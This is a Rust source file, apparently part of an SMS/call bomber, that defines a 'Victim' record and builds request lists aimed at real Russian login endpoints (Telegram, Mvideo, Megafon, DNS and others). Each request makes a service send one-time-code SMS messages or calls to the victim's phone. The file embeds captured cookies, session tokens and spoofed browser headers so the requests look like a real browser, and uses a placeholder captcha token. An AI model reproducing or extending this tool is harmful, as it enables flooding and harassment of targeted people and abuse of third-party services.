use crate::phone::FormatterTypes::Without7;
use crate::phone::{Country, FormatterTypes::WithPlus, Phone};
use reqwest::header::HeaderMap;
use reqwest::Method;
use serde_json::json;

#[derive(Debug, Clone)]
pub struct Service {
    pub name: String,
    pub service_type: ServiceType,
    pub method: Method,
    pub url: String,
    pub headers: HeaderMap,
    pub body_type: BodyType,
    pub body: serde_json::Value,
}

#[derive(Debug, Clone, PartialEq)]
pub enum ServiceType {
    Sms,
    Call,
    InserviceMessage,
}

#[allow(clippy::upper_case_acronyms)]
#[derive(Debug, Clone)]
pub enum BodyType {
    JSON,
    Form,
}

#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct Victim {
    pub phone: Phone,
    pub email: String,
    pub name: String,
    pub surname: String,
}

/*
//
{
    let mut service = Service {
        name: "".to_string(),
        service_type: ServiceType::,
        method: Method::,
        url: "".to_string(),
        headers: HeaderMap::new(),
        body_type: BodyType::,
        body: Default::default(),
    };

    service.headers.insert("", r#""#.parse().unwrap());

    let mut phone = victim.phone.clone();
    phone.format(WithPlus);
    service.body = json!({
        "phone": phone.phone
    });

    services.push(service);
}
*/

pub fn construct_services_list(victim: Victim) -> Vec<Service> {
    let mut services = Vec::new();

    match victim.phone.country {
        Country::Ru => {
            // Telegram
            {
                let mut service = Service {
                    name: "Telegram".to_string(),
                    service_type: ServiceType::InserviceMessage,
                    method: Method::POST,
                    url: "https://my.telegram.org/auth/send_password".to_string(),
                    headers: HeaderMap::new(),
                    body_type: BodyType::Form,
                    body: Default::default(),
                };

                let mut phone = victim.phone.clone();
                phone.format(WithPlus);
                service.body = json!({
                    "phone": phone.phone
                });

                services.push(service);
            }
            // 4lapy
            {
                let mut service = Service {
                    name: "4lapy".to_string(),
                    service_type: ServiceType::Sms,
                    method: Method::POST,
                    url: "https://4lapy.ru/api/auth/newCode/".to_string(),
                    headers: HeaderMap::new(),
                    body_type: BodyType::JSON,
                    body: Default::default(),
                };

                service.headers.insert("Cookie", r#"currentPage=%2Flandings%2Fdobrolap%2F; previousPage=%2F; 4lapy_site_v5=new; 4lapy_site_force=true; NEXT_CUSTOMER_TOKEN=%7B%22accessToken%22%3A%22eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ6TzRUSGllX05QTW5uWkFQOXFLZC1FaElvbGNCY1dhSVFzUUdVLWJGVTc4In0.eyJleHAiOjE3MjMxMTc5NjEsImlhdCI6MTcyMzExNzY2MSwianRpIjoiZTdhY2UzNDAtNTNhMi00ODcyLWIyZDItMWQ0NzJlNmNkZjk5IiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay5pbmZyYS9yZWFsbXMvY3VzdG9tZXIiLCJhdWQiOiJhY2NvdW50Iiwic3ViIjoiNWY0M2Q0ZmEtNDdhMi00ZGRlLWEwN2ItZTVhNWIyMGYyMTU1IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoid2ViLWN1c3RvbWVyIiwic2Vzc2lvbl9zdGF0ZSI6IjU5ZjhhMDRjLWUzZmYtNDUzNS04ZDhiLTRlMDgwZWY1YTNjNyIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsib2ZmbGluZV9hY2Nlc3MiLCJ1bWFfYXV0aG9yaXphdGlvbiIsImRlZmF1bHQtcm9sZXMtY3VzdG9tZXIiXX0sInJlc291cmNlX2FjY2VzcyI6eyJhY2NvdW50Ijp7InJvbGVzIjpbIm1hbmFnZS1hY2NvdW50IiwibWFuYWdlLWFjY291bnQtbGlua3MiLCJ2aWV3LXByb2ZpbGUiXX19LCJzY29wZSI6InByb2ZpbGUgZW1haWwiLCJzaWQiOiI1OWY4YTA0Yy1lM2ZmLTQ1MzUtOGQ4Yi00ZTA4MGVmNWEzYzciLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImN1c3RvbWVySWQiOjkxNjcyNTM3LCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJjYmZmNzFkNDFmZGI0OGQ1OThjZGM1ZWMxZGI1ZTUyOCJ9.Ournlzfj7p-IeI0zYR8AIx1JN8z7d_aJ-VIlzSYG7pkKRlah_94VFEP4TOkObBrd2PWi0lhuEAWB8WRcXfKpDh-nENd8rPUpN9qs0_kRq2Phb_Rv846sBFkuYHDXXk379cqFpA-Amo0ATXpNxyaY6ladj4LDCrs7R020zjGdbyvg8_XroTS8pOihZeW8LJMyrKSH0bPjQ5BTnMyidnU4bjVidTaWF4QL6Itv6gioCSUpdy2vXosqMkwn2_1VpRM-FgmeKWsbFgohHbA2Vx1tnvqmknNwJrf-kKPw_YIeRiyF7R3Wshxr26nnNz39FLDyHeKq6k0ihUDSF_MkpToQfQ%22%2C%22refreshToken%22%3A%22eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJlNWQ5MTc0Yi0yZWJjLTQ4ZmItOGM0NC03ZTg0M2E2ZmYxNmEifQ.eyJleHAiOjE3MjU3MDk2NjEsImlhdCI6MTcyMzExNzY2MSwianRpIjoiZWUwYzE1MDktZjBkMi00Zjk3LThjNDItNDMyMGVmNTdkZjhmIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay5pbmZyYS9yZWFsbXMvY3VzdG9tZXIiLCJhdWQiOiJodHRwczovL2tleWNsb2FrLmluZnJhL3JlYWxtcy9jdXN0b21lciIsInN1YiI6IjVmNDNkNGZhLTQ3YTItNGRkZS1hMDdiLWU1YTViMjBmMjE1NSIsInR5cCI6IlJlZnJlc2giLCJhenAiOiJ3ZWItY3VzdG9tZXIiLCJzZXNzaW9uX3N0YXRlIjoiNTlmOGEwNGMtZTNmZi00NTM1LThkOGItNGUwODBlZjVhM2M3Iiwic2NvcGUiOiJwcm9maWxlIGVtYWlsIiwic2lkIjoiNTlmOGEwNGMtZTNmZi00NTM1LThkOGItNGUwODBlZjVhM2M3In0.L1Eao_rMK3uitZlkaAoBjATCR2P90RUlBWVxr-N56cw%22%2C%22tokenType%22%3A%22Bearer%22%2C%22expiresIn%22%3A300%2C%22sessionState%22%3A%2259f8a04c-e3ff-4535-8d8b-4e080ef5a3c7%22%2C%22scope%22%3A%22profile%20email%22%2C%22refreshExpiresIn%22%3A2592000%2C%22expiresAt%22%3A1723117961469%2C%22refreshExpiresAt%22%3A1725709661469%7D; g4c_x=1; _userGUID=0:lzl7rn6h:7sThR1GuZizvLXpg8tqkDPqYlire9LZT; dSesn=dd062781-f6e3-1bc6-a597-b1d859b692e7; _dvs=0:lzl7rn6h:aqZJzNtf1Q~QJQj23NMmPzXidgA~ctgK; location=%7B%22postalCode%22%3A%22101000%22%2C%22fiasId%22%3A%220c5b2444-70a0-4932-980c-b4dc0d3f02b5%22%2C%22kladrId%22%3A%227700000000000%22%2C%22rusRegionId%22%3A77%2C%22regionFiasId%22%3A%220c5b2444-70a0-4932-980c-b4dc0d3f02b5%22%2C%22regionName%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%20%D0%B3%D0%BE%D1%80%D0%BE%D0%B4%22%2C%22areaName%22%3A%22%20%22%2C%22cityName%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22settlementName%22%3A%22%22%2C%22streetName%22%3A%22%20%22%2C%22houseName%22%3A%22%20%22%2C%22flatName%22%3A%22%20%22%2C%22typeCode%22%3A%22region%22%2C%22typeName%22%3A%22%D0%B3%D0%BE%D1%80%D0%BE%D0%B4%22%2C%22value%22%3A%22%D0%B3%20%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%2C%22geo_lat%22%3A%2255.75396%22%2C%22geo_lon%22%3A%2237.620393%22%2C%22timezone%22%3A%22UTC%2B3%22%2C%22streetShort%22%3A%22%22%2C%22streetType%22%3A%22%22%2C%22houseShort%22%3A%22%22%2C%22houseType%22%3A%22%22%2C%22blockName%22%3A%22%22%2C%22blockType%22%3A%22%22%7D; polygon=r468-10-14-14-18-18-22; _ga_GRN90Z74D3=GS1.1.1723117669.1.1.1723117749.44.0.0; _ga=GA1.1.1699357532.1723117670; rrpvid=962500276817422; tmr_lvid=886243903520ca301abd3c3dd7f6c5fd; tmr_lvidTS=1723117672164; rcuid=66b4b06d5a442c690dc06be2; _ym_uid=1723117678991205878; _ym_d=1723117678; _ym_isad=2; domain_sid=HUoqZbDBqQL6J3ihwirC9%3A1723117681381; tmr_detect=0%7C1723117683099; cookieShown=true"#.parse().unwrap());

                let phone = victim.phone.clone();
                service.body = json!({
                    "phone": phone.phone
                });

                services.push(service);
            }
            // Mvideo
            {
                let mut service = Service {
                    name: "Mvideo".to_string(),
                    service_type: ServiceType::Sms,
                    method: Method::POST,
                    url: "https://www.mvideo.ru/bff/auth/login-step-1".to_string(),
                    headers: HeaderMap::new(),
                    body_type: BodyType::JSON,
                    body: Default::default(),
                };

                service.headers.insert(
                    "User-Agent",
                    r#"Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0"#
                        .parse()
                        .unwrap(),
                );
                service
                    .headers
                    .insert("Accept", r#"application/json"#.parse().unwrap());
                service.headers.insert(
                    "Accept-Language",
                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Accept-Encoding",
                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
                );
                service
                    .headers
                    .insert("Content-Type", r#"application/json"#.parse().unwrap());
                service.headers.insert(
                    "x-set-application-id",
                    r#"ef24eb29-42b2-4ef4-8f6f-3ad5033d0a6a"#.parse().unwrap(),
                );
                service.headers.insert("X-GIB-GSSCgib-w-mvideo", r#"snXsuoSjjiFKPTVzRAlZ5VWUrp5jucLvMddFAa9Va/1yc22FV2udhJ3o2hy9crWyNy/BxCS9jkDibVS1Wzs0OUl5z6N8PGYa9rrckT91Y20V9XV0NCy0NdPRIuNYrLBLUJidHC+GS3qUv1kLVJ/EMyNGYzZDWPP5ntgqTnD8b80aCLRah5ffuxw4/AobjnshxWD9yy9qkmvJ2i3acA3o9vV/3fA8j5UkgAAkPUM2/MMGWolLLoEfeFlEXxvkiT3z+jLuru2k"#.parse().unwrap());
                service.headers.insert(
                    "X-GIB-FGSSCgib-w-mvideo",
                    r#"syzfa9eb36b6d5cbe0ea8120b2e3b71e2efde782"#.parse().unwrap(),
                );
                service.headers.insert(
                    "sentry-trace",
                    r#"5207ca627ee64776bd9ac08514f88242-8497480eac35c1d7-0"#
                        .parse()
                        .unwrap(),
                );
                service.headers.insert("baggage", r#"sentry-environment=production,sentry-release=release_24_8_1(8394),sentry-public_key=ae7d267743424249bfeeaa2e347f4260,sentry-trace_id=5207ca627ee64776bd9ac08514f88242,sentry-sample_rate=0.1,sentry-transaction=%2F,sentry-sampled=false"#.parse().unwrap());
                service
                    .headers
                    .insert("Origin", r#"https://www.mvideo.ru"#.parse().unwrap());
                service
                    .headers
                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
                service
                    .headers
                    .insert("Referer", r#"https://www.mvideo.ru/"#.parse().unwrap());
                service.headers.insert("Cookie", r#"__hash_=4dccae4003b911a9277ae8245e017327; __lhash_=88ca3741bfaa20eeba582564f0f5dc56; MVID_AB_PERSONAL_RECOMMENDS=true; MVID_AB_PERSONAL_RECOMMENDS_SRP=true; MVID_AB_UPSALE=true; MVID_ACCESSORIES_ORDER_SET_VERSION=2; MVID_ACCESSORIES_PDP_BY_RANK=true; MVID_BR_CONVERSION=true; MVID_CASCADE_CMN=true; MVID_CHAT_VERSION=6.6.0; MVID_CITY_ID=CityCZ_2128; MVID_CREDIT_DIGITAL=true; MVID_CREDIT_SERVICES=true; MVID_CRITICAL_GTM_INIT_DELAY=3000; MVID_DIGINETICA_ENABLED=true; MVID_DISABLEDITEM_PRICE=true; MVID_DISPLAY_ACCRUED_BR=true; MVID_DISPLAY_PERS_DISCOUNT=true; MVID_EMPLOYEE_DISCOUNT=true; MVID_FILTER_CODES=true; MVID_FLOCKTORY_ON=true; MVID_GEOLOCATION_NEEDED=true; MVID_GROUP_BY_QUALITY=true; MVID_GTM_ENABLED=011; MVID_IMG_RESIZE=true; MVID_IS_NEW_BR_WIDGET=true; MVID_KLADR_ID=2300000100000; MVID_MULTIOFFER=true; MVID_NEW_CHAT_PDP=true; MVID_NEW_LK_CHECK_CAPTCHA=true; MVID_NEW_LK_OTP_TIMER=true; MVID_NEW_PATCH_SHOPPING_CART_GUID_DETAILS_ACTIVITY=true; MVID_NEW_PATCH_SHOPPING_CART_GUID_IDENTITY=true; MVID_NEW_POST_SHOPPING_CART_GUID_ITEMS_DELETE=true; MVID_REGION_ID=11; MVID_REGION_SHOP=S911; MVID_SERVICES=111; MVID_SERVICE_AVLB=true; MVID_SP=true; MVID_TIMEZONE_OFFSET=3; MVID_TYP_CHAT=true; MVID_WEB_SBP=true; SENTRY_ERRORS_RATE=0.1; SENTRY_REPLAYS_ERRORS_RATE=0.01; SENTRY_REPLAYS_SESSIONS_RATE=0.01; SENTRY_TRANSACTIONS_RATE=0.1; MVID_ENVCLOUD=prod2; cfidsgib-w-mvideo=I4VhLBPFjyYb5aZRce+8rTFj+Yhc2zDY8U6UuxHNKsUbqHdsIarIrn+EmGPuTyxqcD5U+bzgMpxizak+b4OeUq1GyTObwaVyW6LQnezWY6J5e2REWWzRx6mDGawbkCYn9vdlEUYairui/lLYg/PKbsMC2NTlVL5kckDu; gsscgib-w-mvideo=snXsuoSjjiFKPTVzRAlZ5VWUrp5jucLvMddFAa9Va/1yc22FV2udhJ3o2hy9crWyNy/BxCS9jkDibVS1Wzs0OUl5z6N8PGYa9rrckT91Y20V9XV0NCy0NdPRIuNYrLBLUJidHC+GS3qUv1kLVJ/EMyNGYzZDWPP5ntgqTnD8b80aCLRah5ffuxw4/AobjnshxWD9yy9qkmvJ2i3acA3o9vV/3fA8j5UkgAAkPUM2/MMGWolLLoEfeFlEXxvkiT3z+jLuru2k; fgsscgib-w-mvideo=syzfa9eb36b6d5cbe0ea8120b2e3b71e2efde782; fgsscgib-w-mvideo=syzfa9eb36b6d5cbe0ea8120b2e3b71e2efde782; _userGUID=0:lzli6o73:6Jr6SUWfwcF27ck5Rk3wQ~Ek8bNBmLSf; mindboxDeviceUUID=db26e639-887a-4a4f-b78c-f505b0fa19dc; directCrm-session=%7B%22deviceGuid%22%3A%22db26e639-887a-4a4f-b78c-f505b0fa19dc%22%7D; dSesn=4c73badc-90d8-9fa5-76cb-5e762a7622e4; _dvs=0:lzli6o73:EY7GgmPIj0kCSVd7Lsq5pOj7d0aVtWZS; _ga_CFMZTSS5FM=GS1.1.1723135163.1.0.1723135163.0.0.0; _ga=GA1.1.859026648.1723135163; _ga_BNX5WPP3YK=GS1.1.1723135163.1.0.1723135163.60.0.0; _sp_ses.d61c=*; _sp_id.d61c=837f52ed-2037-4f1c-ade5-078c7957c986.1723135164.1.1723135166..a02c9f97-92df-4d1e-b009-04ca682ffbae..b1c1e752-f061-4bce-8ebf-dc9ae7938534.1723135163630.19; gsscgib-w-mvideo=snXsuoSjjiFKPTVzRAlZ5VWUrp5jucLvMddFAa9Va/1yc22FV2udhJ3o2hy9crWyNy/BxCS9jkDibVS1Wzs0OUl5z6N8PGYa9rrckT91Y20V9XV0NCy0NdPRIuNYrLBLUJidHC+GS3qUv1kLVJ/EMyNGYzZDWPP5ntgqTnD8b80aCLRah5ffuxw4/AobjnshxWD9yy9qkmvJ2i3acA3o9vV/3fA8j5UkgAAkPUM2/MMGWolLLoEfeFlEXxvkiT3z+jLuru2k; gsscgib-w-mvideo=snXsuoSjjiFKPTVzRAlZ5VWUrp5jucLvMddFAa9Va/1yc22FV2udhJ3o2hy9crWyNy/BxCS9jkDibVS1Wzs0OUl5z6N8PGYa9rrckT91Y20V9XV0NCy0NdPRIuNYrLBLUJidHC+GS3qUv1kLVJ/EMyNGYzZDWPP5ntgqTnD8b80aCLRah5ffuxw4/AobjnshxWD9yy9qkmvJ2i3acA3o9vV/3fA8j5UkgAAkPUM2/MMGWolLLoEfeFlEXxvkiT3z+jLuru2k; _ym_uid=1723135164684877333; _ym_d=1723135164; _ym_isad=2; _ym_visorc=w; __SourceTracker=google__organic; admitad_deduplication_cookie=google__organic; SMSError=; authError=; gdeslon.ru.__arc_domain=gdeslon.ru; gdeslon.ru.user_id=716d5d1a-0719-4316-9686-3ac4560d7b02; advcake_track_id=feb415f1-9815-e908-7149-5c6421c9402e; advcake_session_id=787a6cdc-7d92-fbba-c3d5-1da5881815ea; flocktory-uuid=84a7d1ec-1011-4ecf-a3bc-964d4fbbd452-5; uxs_uid=c713dd20-55a4-11ef-97c6-a71198f127bb; advcake_track_url=%3D20240805CsxSI1gOEl8Nn0H6ZFnpf8JbhBK3zAbXNkhUcububbMBaXY%2F9oIi8dWI%2B2dCCf1QkAiXKMUB7MAFmy0ywc3Ui%2FZH5pyhWQB2z9MnqT28%2B9CRB2dnAa4N6cN%2F%2B8Bq%2BzneGs9l%2Brb5NIm%2BFE9YTKMnWSHvOTXL3UCSdjByFK25kuHl6McTG0XmQf%2B0V%2F%2Fwn%2BuOUrgSVsePQKk67%2BJQ74AdN%2F%2F5BEAzK76tEBlQHzvZFF1tnXN%2FK8uG1YYrOwgktF4i2z4cIgzTA%2F8rUIs1UE7ZIVqHF0RXZ7MbtwqI9EzoTFSPdmzrMcbEAIW4DC6x4NQ51EVu6zlJQhbT2mWRhLtYcPc8UTwzbKRFzEYYbUybnkm8oQ3geBeXdK3aDdfMf0mUb2roIvslgKkCBPBLOUn5yMv3ST0weW5ZgyP5MIAuFvsMyYtcwF5%2BGGCrIJ7WTtdqPIjtPSDW6PSYOVQmbF04k4RsHS2OMYiRK6GBE0UtieHlkrk4ezovp17frznD979tVwrTfwdlixnoO0CJUahy2dqaJYj2gP1dEc4g9zNUn4ySpr37c5swL6KAMCFTPtdlLAc3WiTrrElm7npYecTNEd7JT39y9GSz7%2Fyln1Z2CabqbncIOaLZzowK88kdP6tI704Kc1zhnIoFCCXIXddedjWuQwAZaKaqgdrY0i8F2RFwFJM3mt2Ac9Q%3D; flacktory=no; BIGipServeratg-ps-prod_tcp80=2416237578.20480.0000; bIPs=1949759381; tmr_lvid=544a75f2cc463ca387d29734580db36b; tmr_lvidTS=1723135170271; domain_sid=QeGVvxs5CooUo9zLDE95y%3A1723135171327; afUserId=d8a70f82-a6ef-4d79-9d8f-31694b6e8283-p; AF_SYNC=1723135172269; adrdel=1723135172355; adrdel=1723135172355; adrcid=Ak4xeXjMzBPWwVw3LLLzeFg; adrcid=Ak4xeXjMzBPWwVw3LLLzeFg; tmr_detect=0%7C1723135172815"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
                service
                    .headers
                    .insert("Priority", r#"u=0"#.parse().unwrap());
                service.headers.insert("TE", r#"trailers"#.parse().unwrap());

                let mut phone = victim.phone.clone();
                phone.format(WithPlus);
                service.body = json!({
                    "phoneNumber": phone.phone,
                    "token": "nocaptchatoken",
                    "sendBy": "CASCADE",
                    "action": "SENT_PIN_CODE"
                });

                services.push(service);
            }

            // Operators
            // Megafon
            {
                let mut service = Service {
                    name: "Megafon".to_string(),
                    service_type: ServiceType::Sms,
                    method: Method::POST,
                    url: "https://lk.megafon.ru/api/auth/otp/request".to_string(),
                    headers: HeaderMap::new(),
                    body_type: BodyType::Form,
                    body: Default::default(),
                };

                service.headers.insert("User-Agent", r#"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0"#.parse().unwrap());
                service.headers.insert(
                    "Accept",
                    r#"application/json, text/plain, */*"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Accept-Language",
                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Accept-Encoding",
                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
                );
                service
                    .headers
                    .insert("Referer", r#"https://lk.megafon.ru/login"#.parse().unwrap());
                service.headers.insert(
                    "Content-Type",
                    r#"application/x-www-form-urlencoded; charset=UTF-8"#
                        .parse()
                        .unwrap(),
                );
                service
                    .headers
                    .insert("X-App-Type", r#"react_lk"#.parse().unwrap());
                service
                    .headers
                    .insert("X-Cabinet-Capabilities", r#"web-2020"#.parse().unwrap());
                service.headers.insert(
                    "traceparent",
                    r#"00-3c12254297d2b3c78b6b333820442716-c1abbf0182398532-01"#
                        .parse()
                        .unwrap(),
                );
                service
                    .headers
                    .insert("Origin", r#"https://lk.megafon.ru"#.parse().unwrap());
                service
                    .headers
                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
                service.headers.insert("Cookie", r#"LB-lk.megafon.ru=ffffffff0978c6a545525d5f4f58455e445a4a423660; page_load_start=1723118955914; DEVICE-ID=ce6fe18a-64e7-45b6-84c3-f9a3cae5588a; CSRF-TOKEN=0b193280-3bfa-4104-8084-f002febc4cf4; JSESSIONID=dc7806f8-cb02-49c4-a4aa-2bcf7a0e22c6; AUTOLOGIN-CHAIN-SESSION-KEY=8fb705f1-2e73-4984-86da-f3c858d90454; USER-REFERENCE-ID=7lBhADJeoRq2AeHmdIG2hw; _ym_uid=1723118949631111238; _ym_d=1723118949; _ym_isad=2; _ymab_param=VxcsX2bLdzwzxnUVPLAxUnBMRoW6E9LXybZoebjUAX2SKTHMD_x0N-AqRpdoT-KTpUrNs8ccvFAvi2egoTqL6umIzBA"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
                service
                    .headers
                    .insert("Priority", r#"u=0"#.parse().unwrap());

                let mut phone = victim.phone.clone();
                phone.format(Without7);
                service.body = json!({
                    "login": phone.phone,
                    "captchaReady": true
                });

                services.push(service);
            }
        }
    }

    services
}

pub fn construct_call_services_list(victim: Victim) -> Vec<Service> {
    let mut services = Vec::new();

    match victim.phone.country {
        Country::Ru => {
            // DNS
            {
                let mut service = Service {
                    name: "DNS".to_string(),
                    service_type: ServiceType::Call,
                    method: Method::POST,
                    url: "https://www.dns-shop.ru/auth/auth/fast-authorization/".to_string(),
                    headers: HeaderMap::new(),
                    body_type: BodyType::Form,
                    body: Default::default(),
                };

                service.headers.insert("Cookie", r#"qrator_jsr=1723134943.891.bZA1mPLKscU7myr3-no9pgdc87rb1cc41j5c435122d4m4aee-00; qrator_ssid=1723134945.200.tB6sCNRMTxnS9mZT-th5o0b3bc8jr2ql6dc0ccp978iphttq5; qrator_jsid=1723134943.891.bZA1mPLKscU7myr3-k4tmm4n3g0v9ekubja8t83bea7frprd7; lang=ru; city_path=moscow; current_path=605bfdc517d7e9e23947448a9bf1ce16ac36b884434a3fdb10db053793c50392a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22current_path%22%3Bi%3A1%3Bs%3A115%3A%22%7B%22city%22%3A%2230b7c1f3-03fb-11dc-95ee-00151716f9f5%22%2C%22cityName%22%3A%22%5Cu041c%5Cu043e%5Cu0441%5Cu043a%5Cu0432%5Cu0430%22%2C%22method%22%3A%22manual%22%7D%22%3B%7D; phonesIdentV2=0c63b8e9-77d0-449f-b0dd-ec99e69c9dc6; cartUserCookieIdent_v3=1a84a07b671c1aecbf929fa9faafcbcb91ce57f6d1ea2adb6dcdce4cdbec3befa%3A2%3A%7Bi%3A0%3Bs%3A22%3A%22cartUserCookieIdent_v3%22%3Bi%3A1%3Bs%3A36%3A%2265b0aa3b-e0f6-3c7e-beae-4715bf8b306c%22%3B%7D; _ab_=%7B%22catalog-filter-title-test%22%3A%22GROUP_2%22%7D; rrpvid=560296951004103; _ga_FLS4JETDHW=GS1.1.1723134957.1.1.1723134991.26.0.1400768249; _ga=GA1.1.298649215.1723134957; rcuid=66b4f3eeee55c15e759d7a55; tmr_lvid=fff40a89d5b30007c58d61cc405ab33b; tmr_lvidTS=1723134960450; _ym_uid=1723134961314038164; _ym_d=1723134961; _ym_isad=2; _ym_visorc=b; domain_sid=Dqj17u3-29WrUNyaTzlrr%3A1723134962861; tmr_detect=0%7C1723134968561; dnsauth_csrf=c02db7507fd5c3a7acba66f204a2934353e7910cdbeb6fa0dd3b4e94f0694389a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22dnsauth_csrf%22%3Bi%3A1%3Bs%3A36%3A%220085e58d-a105-4e76-b118-2a7bf227969a%22%3B%7D"#.parse().unwrap());

                let mut phone = victim.phone.clone();
                phone.format(WithPlus);
                service.body = json!({
                    "FastAuthorizationLoginLoadForm[login]": phone.phone,
                    "FastAuthorizationLoginLoadForm[token]" : "",
                    "FastAuthorizationLoginLoadForm[isPhoneCall]": 1
                });

                services.push(service);
            }
            // Sunlight
            {
                let mut service = Service {
                    name: "Sunlight".to_string(),
                    service_type: ServiceType::Call,
                    method: Method::POST,
                    url: "https://api.sunlight.net/modules/customer-auth/v1/web/send/".to_string(),
                    headers: HeaderMap::new(),
                    body_type: BodyType::JSON,
                    body: Default::default(),
                };

                service.headers.insert(
                    "User-Agent",
                    r#"Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0"#
                        .parse()
                        .unwrap(),
                );
                service.headers.insert(
                    "Accept",
                    r#"application/json, text/javascript, */*; q=0.01"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Accept-Language",
                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Accept-Encoding",
                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
                );
                service
                    .headers
                    .insert("Content-Type", r#"application/json"#.parse().unwrap());
                service.headers.insert(
                    "User-Local-Time",
                    r#"2024-08-18T13:49:28.279Z"#.parse().unwrap(),
                );
                service.headers.insert(
                    "Customer-Source",
                    r#"612f086bcbbe9407b1b104984d8bd66db1ca36da697d1a960d5f2ac5cc719156"#
                        .parse()
                        .unwrap(),
                );
                service
                    .headers
                    .insert("Origin", r#"https://sunlight.net"#.parse().unwrap());
                service.headers.insert("DNT", r#"1"#.parse().unwrap());
                service.headers.insert("Sec-GPC", r#"1"#.parse().unwrap());
                service
                    .headers
                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
                service.headers.insert("Cookie", r#"city_auto_popup_shown=1; city_id=149; city_name=%D0%A0%D0%B0%D0%BC%D0%B5%D0%BD%D1%81%D0%BA%D0%BE%D0%B5; city_full_name=%D0%A0%D0%B0%D0%BC%D0%B5%D0%BD%D1%81%D0%BA%D0%BE%D0%B5%2C%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB; region_id=bd3d9701-eb48-4739-adb9-ba3536191ca3; region_name=%D0%A0%D0%B0%D0%BC%D0%B5%D0%BD%D1%81%D0%BA%D0%BE%D0%B5; region_subdomain=""; cart=on; seo_campaign=b19ea3b5-1a6f-4eb5-9486-45946be9e03f"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
                service
                    .headers
                    .insert("Sec-Fetch-Site", r#"same-site"#.parse().unwrap());

                let mut phone = victim.phone.clone();
                phone.format(WithPlus);
                service.body = json!({
                    "phone": phone.phone,
                    "source": "web_auth_page"
                });

                services.push(service);
            }
        }
    }

    services
}
